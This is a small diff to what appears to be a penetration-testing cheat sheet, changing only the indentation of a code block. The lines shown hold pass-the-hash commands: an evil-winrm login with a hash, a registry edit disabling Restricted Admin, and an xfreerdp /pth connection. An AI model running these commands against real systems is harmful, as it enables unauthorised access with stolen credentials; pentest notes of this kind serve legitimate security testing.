@@ -53,8 +53,7 @@ evil-winrm -i $IP -u $USERNAME -H $HASH
 	reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 	```
 	-Run xfreerdp with /pth flag
-```bash
-xfreerdp /v:$IP /u:$USERNAME /pth:$HASH
-```
+	```bash
+	xfreerdp /v:$IP /u:$USERNAME /pth:$HASH
+	```
 
-- 
